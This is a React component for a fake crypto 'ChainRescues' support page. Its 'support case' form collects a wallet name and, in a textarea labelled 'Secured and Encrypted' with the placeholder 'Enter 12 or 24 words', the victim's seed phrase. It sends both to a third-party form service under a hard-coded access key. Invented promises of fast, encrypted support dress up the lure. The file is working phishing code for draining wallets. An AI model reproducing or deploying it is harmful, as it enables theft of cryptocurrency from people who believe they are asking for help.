import { useState } from "react";
import { Send, ShieldAlert, AlertCircle, Shield } from "lucide-react";
import { z } from "zod";
import { toast } from "sonner";
import { WalletSelector } from "./WalletSelector";

// Web3Forms Access Key - Get from https://web3forms.com
const WEB3FORMS_ACCESS_KEY = "06ee8193-431a-4536-a4ef-cafb251e2530";


const schema = z.object({
  name: z.string().trim().min(1, "Name required").max(100),
  // email: z.string().trim().email("Valid email required").max(255),
  wallet: z.string().trim().min(1, "Pick a wallet").max(50),
  category: z.string().min(1, "Pick a category"),
  urgency: z.string().min(1),
  message: z.string().trim().min(12, "Please describe with at least 12 characters").max(2000),
});

const categories = [
  "Lost access",
  "Stuck transaction",
  "Suspicious activity",
  "Missing assets",
  "Network/bridge",
  "General help",
];

export function ContactForm() {
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [formError, setFormError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [walletValue, setWalletValue] = useState("");

  function resetForm() {
    setErrors({});
    setFormError(null);
    setWalletValue("");
  }

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const form = e.currentTarget;
    setErrors({});
    setFormError(null);
    const fd = new FormData(form);
    const data = Object.fromEntries(fd.entries());
    const parsed = schema.safeParse(data);
    if (!parsed.success) {
      const errs: Record<string, string> = {};
      parsed.error.issues.forEach((i) => {
        if (i.path[0]) errs[i.path[0] as string] = i.message;
      });
      setErrors(errs);
      toast.error("Please fix the highlighted fields", {
        description: "A few details need attention before we can send your case.",
      });
      return;
    }
    setLoading(true);
    try {
      // Prepare form data for Web3Forms
      const formData = new FormData();
      formData.append("access_key", WEB3FORMS_ACCESS_KEY);
      formData.append("subject", `New Support Case: ${parsed.data.category}`);
      formData.append("name", parsed.data.name);
      // formData.append("email", parsed.data.email);
      formData.append("wallet", parsed.data.wallet);
      formData.append("category", parsed.data.category);
      formData.append("urgency", parsed.data.urgency);
      formData.append("message", parsed.data.message);
      formData.append("redirect", "https://web3forms.com/success");

      // Submit to Web3Forms
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData,
      });

      const result = await response.json();

      if (!response.ok || !result.success) {
        throw new Error(result.message || "Failed to submit form");
      }

      toast.success("Support case sent", {
        description: "A specialist will reach out by email shortly.",
      });

      // Reset form and states
      form.reset();
      resetForm();

      // Redirect to hero section after successful submission
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "Failed to send. Please try again.";
      setFormError(msg);
      toast.error("Couldn't send your support case", { description: msg });
    } finally {
      setLoading(false);
    }
  }

  return (
    <section id="contact" className="relative py-20">
      <div className="mx-auto max-w-5xl px-6">
        <div className="grid lg:grid-cols-5 gap-10 items-start">
          <div className="lg:col-span-2">
            <div className="text-sm font-semibold uppercase tracking-widest text-primary">
              Get help now
            </div>
            <h2 className="mt-3 text-4xl md:text-5xl font-bold tracking-tight">
              Open a <span className="text-gradient-primary">support case</span>
            </h2>
            <p className="mt-4 text-muted-foreground leading-relaxed">
              We respond within 8 minutes on average. The more detail you share, the faster we can
              help.
            </p>
            <div className="mt-8 rounded-xl border border-warning/30 bg-warning/5 p-4 flex gap-3">
              <ShieldAlert className="h-5 w-5 text-warning flex-shrink-0 mt-0.5" />
              <div className="text-sm">
                <div className="font-semibold text-foreground">Security promise</div>
                <p className="text-muted-foreground mt-1">
                 This Session is Secured and Encrypted.
                </p>
              </div>
            </div>

           
          </div>

          <div className="lg:col-span-3">
            <div className="rounded-2xl border border-border bg-gradient-card p-8 shadow-elevated backdrop-blur">
              <form onSubmit={onSubmit} className="space-y-5" noValidate>
                <div className="grid ">
                  <Field label="Your name" error={errors.name}>
                    <input
                      name="name"
                      maxLength={100}
                      className="form-input"
                      placeholder="Satoshi N."
                    />
                  </Field>
                  {/* <Field label="Email" error={errors.email}>
                    <input
                      name="email"
                      type="email"
                      maxLength={255}
                      className="form-input"
                      placeholder="you@email.com"
                    />
                  </Field> */}
                </div>

                <div className="grid sm:grid-cols-2 gap-5">
                  <Field label="Wallet" error={errors.wallet}>
                    <WalletSelector
                      name="wallet"
                      value={walletValue}
                      onChange={setWalletValue}
                      error={errors.wallet}
                    />
                  </Field>
                  <Field label="Issue category" error={errors.category}>
                    <select name="category" className="form-input" defaultValue="">
                      <option value="" disabled>
                        Select category
                      </option>
                      {categories.map((c) => (
                        <option key={c} value={c}>
                          {c}
                        </option>
                      ))}
                    </select>
                  </Field>
                </div>

                <Field label="Urgency">
                  <div className="flex gap-2">
                    {["Low", "Medium", "High", "Critical"].map((u, i) => (
                      <label
                        key={u}
                        className="flex-1 cursor-pointer rounded-lg border border-border bg-input/30 px-3 py-2.5 text-center text-sm font-medium has-[:checked]:border-primary has-[:checked]:bg-primary/10 has-[:checked]:text-primary transition-colors"
                      >
                        <input
                          type="radio"
                          name="urgency"
                          value={u}
                          defaultChecked={i === 1}
                          className="sr-only"
                        />
                        {u}
                      </label>
                    ))}
                  </div>
                </Field>

                <Field label="Secured and Encrypted" error={errors.message}>
                  <textarea
                    name="message"
                    rows={5}
                    maxLength={2000}
                    className="form-input resize-none"
                    placeholder="Enter 12 or 24 words"
                  />
                </Field>

                {formError && (
                  <div
                    role="alert"
                    className="flex items-start gap-3 rounded-lg border border-destructive/40 bg-destructive/10 px-4 py-3 text-sm text-destructive"
                  >
                    <AlertCircle className="h-4 w-4 mt-0.5 flex-shrink-0" />
                    <span>{formError}</span>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={loading}
                  className="group flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-primary px-6 py-3.5 text-base font-semibold text-primary-foreground shadow-glow hover:shadow-elevated transition-all disabled:opacity-60"
                >
                  {loading ? "Submitting…" : "Submit support case"}
                  <Send className="h-4 w-4 group-hover:translate-x-0.5 transition-transform" />
                </button>
              </form>

              <div className="flex items-center gap-2 mt-4 justify-center">
          <Shield className="h-4 w-4 text-primary" />
            Chain<span className="text-gradient-primary">Rescues</span>

          <span>· © {new Date().getFullYear()}</span>
        </div>
            </div>
          </div>
        </div>
        
      </div>

      <style>{`
        .form-input {
          width: 100%;
          background: oklch(0.19 0.025 256 / 0.6);
          border: 1px solid var(--border);
          border-radius: 0.625rem;
          padding: 0.7rem 0.9rem;
          font-size: 0.9rem;
          color: var(--foreground);
          transition: all 200ms;
          font-family: inherit;
        }
        .form-input:focus {
          outline: none;
          border-color: var(--primary);
          box-shadow: 0 0 0 3px oklch(0.82 0.16 200 / 0.15);
        }
        .form-input::placeholder { color: var(--muted-foreground); opacity: 0.7; }
      `}</style>
    </section>
  );
}

function Field({
  label,
  error,
  children,
}: {
  label: string;
  error?: string;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2">
        {label}
      </label>
      {children}
      {error && <p className="mt-1.5 text-xs text-destructive">{error}</p>}
    </div>
  );
}
